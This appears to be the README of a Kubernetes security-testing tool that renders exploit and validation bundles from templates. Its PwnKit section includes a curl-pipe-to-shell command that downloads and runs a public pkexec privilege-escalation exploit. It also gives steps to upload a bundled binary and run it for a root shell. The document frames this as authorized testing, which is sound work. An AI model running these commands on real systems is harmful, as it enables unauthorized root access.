# KubeTrail EXP Forge

EXP Forge renders validation bundles from registered KubeTrail EXP templates. It does not execute side-effecting actions by default.

Chinese scenario guide: [README.zh-CN.md](README.zh-CN.md).

## Commands

List templates:

```bash
npm run exp -- list
```

Render a bundle:

```bash
npm run exp -- render --template pod-hostpath --set namespace=default --set serviceAccount=default --set targetPath=/var/run
```

Render to a specific directory:

```bash
npm run exp -- render --template cloud-metadata-verify --out /tmp/kubetrail-exp/imds --set provider=aws
```

Pass structured parameters:

```bash
npm run exp -- render --template pod-create-job --params '{"namespace":"default","image":"busybox:1.36","command":"id; uname -a"}'
```

## Bundle Layout

Generated bundles are written under `KUBETRAIL_AGENT_RUNTIME_DIR/exp/generated/<run-id>` unless `--out` is provided.

Common files:

- `manifest.json`: template ID, mode, parameters, evidence IDs, side effects, and run commands.
- `README.md`: operator-facing instructions.
- `run.sh`: generated command bundles and source-build bundles.
- `apply.yaml` and `cleanup.yaml`: Kubernetes object bundles.
- `patch-add-list.json` and `patch-append.json`: JSON patch bundles.
- `src/` and `build.sh`: generated source-build bundles.

## Template Kinds

- `generated-command`: emits copy/pasteable shell commands.
- `k8s-object`: emits Kubernetes manifests plus cleanup.
- `json-patch`: emits JSON patch files and a wrapper command.
- `source-build`: emits source code and a build script.
- `prebuilt-binary`: references reviewed binaries staged under `exp/assets/bin`.

## Prebuilt Binaries

Prebuilt helpers belong under:

```text
exp/assets/bin/<template-or-poc-id>/<os>-<arch>/<binary>
exp/assets/bin/<template-or-poc-id>/<os>-<arch>/manifest.json
```

Each binary manifest should include source URL, pinned commit or release tag, build command, sha256, arguments, and side effects.

### PwnKit pkexec

The `cve-2021-4034-pwnkit` template uses the `ly4k/PwnKit` project as its primary PoC source:

```text
https://github.com/ly4k/PwnKit
```

If an authorized target can reach GitHub, operators can use the upstream command directly:

```bash
sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"
```

For offline targets, render the KubeTrail bundle and upload the generated binary:

```bash
npm run exp -- render --template cve-2021-4034-pwnkit
```

The bundle copies the reviewed linux-amd64 binary to:

```text
<bundle>/bin/kt-pkexec-lpe
```

Upload that file to the target and run it without arguments for an interactive root shell:

```bash
chmod +x /tmp/kt-pkexec-lpe
/tmp/kt-pkexec-lpe
```

The bundle also includes `USAGE-PWNKIT.md`, `asset-manifest.json`, `src/source-manifest.json`, pinned source, and a rebuild script.

## Execution Modes

- `safe`: read-only checks or local inspection.
- `full`: creates or patches authorized Kubernetes resources and must include cleanup where practical.
- `dangerous`: external PoC or higher-impact validation requiring explicit human review.

The Agent client generates plans and bundles. The operator decides which rendered commands or binaries to run in the authorized research environment.
